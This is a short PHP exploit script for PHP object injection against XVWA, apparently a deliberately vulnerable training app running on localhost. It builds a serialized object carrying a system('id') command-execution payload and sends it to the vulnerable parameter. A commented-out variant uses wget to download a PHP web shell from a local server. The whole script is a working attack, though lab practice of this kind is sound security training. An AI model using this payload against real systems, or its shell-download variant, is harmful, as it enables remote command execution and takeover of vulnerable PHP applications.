<?php

class PHPObjectInjection {
#   public $inject = "system('/usr/bin/wget http://127.0.0.1:8000/phpshell.php');"; # TODO: make a shell
   public $inject = "system('id');";
}

$serialized_data = urlencode(serialize(new PHPObjectInjection));
#stream_context_set_default(['http'=>['proxy'=>'127.0.0.1:8080']]);

# gotta chain the serialized data with url now
$url = 'http://localhost:9090/xvwa/vulnerabilities/php_object_injection/?r=' . $serialized_data; #we have to put the serialized string here
print $url;

$contents = file_get_contents($url);
if($contents !== false) {
  echo $contents;
  echo strlen($contents);
}
else { echo "poop"; }

?>
